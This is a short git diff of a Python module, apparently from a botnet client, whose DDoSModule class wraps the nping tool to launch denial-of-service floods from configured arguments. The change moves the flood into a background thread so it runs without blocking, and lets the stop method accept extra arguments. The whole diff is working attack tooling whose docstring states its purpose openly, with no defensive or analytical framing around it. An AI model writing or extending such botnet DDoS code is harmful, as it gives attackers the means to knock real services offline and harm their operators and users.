@@ -7,6 +7,7 @@ Created on Dec 21, 2013
 from FeatureModule import FeatureModule
 import subprocess
 from domain import BotConfig
+from threading import Thread
 
 class DDoSModule(FeatureModule):
     """ The DDoS class which is able to execute a DDoS attack.
@@ -29,6 +30,11 @@ class DDoSModule(FeatureModule):
             with the given arguments."""
         cline = [BotConfig.NPING_PATH]
         cline = cline + args[0]
+        t = Thread(target=self.__run, args=[cline])
+        t.start()
+    
+    
+    def __run(self, cline):
         self.__nping = subprocess.Popen(cline,
                              shell=False,
                              stdout=subprocess.PIPE,
@@ -39,7 +45,7 @@ class DDoSModule(FeatureModule):
         #prints the results for debug purposes.
         print sout, serr
     
-    def stop(self):
+    def stop(self, *args):
         """ Kills the subprocess."""
         self.__nping.kill()
         
